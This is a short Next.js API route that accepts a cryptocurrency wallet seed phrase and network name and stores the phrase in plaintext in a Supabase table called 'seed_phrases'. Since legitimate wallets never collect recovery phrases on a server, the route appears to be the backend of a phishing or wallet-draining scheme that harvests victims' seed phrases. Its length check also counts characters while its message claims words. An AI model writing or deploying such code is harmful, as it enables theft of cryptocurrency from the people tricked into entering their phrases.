
import { NextResponse } from "next/server";
import { supabaseClient } from "@/lib/supabaseClient";
import { z } from "zod";

const seedPhraseSchema = z.object({
  seedPhrase: z.string().min(12, "Seed phrase must be at least 12 words."),
  network: z.string().min(1, "Network is required."),
});

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const parsed = seedPhraseSchema.safeParse(body);

    if (!parsed.success) {
      return NextResponse.json(
        { error: "Invalid data: " + parsed.error.errors.map(e => e.message).join(", ") },
        { status: 400 }
      );
    }

    const { seedPhrase, network } = parsed.data;

    const { data, error } = await supabaseClient
      .from("seed_phrases")
      .insert([{ seed_phrase: seedPhrase, network }])
      .select();

    if (error) {
      console.error("Supabase insert error:", error);
      return NextResponse.json({ error: "Failed to register seed phrase." }, { status: 500 });
    }

    return NextResponse.json({ success: true, data });
  } catch (err) {
    console.error("Unexpected error:", err);
    return NextResponse.json({ error: "Server error." }, { status: 500 });
  }
}
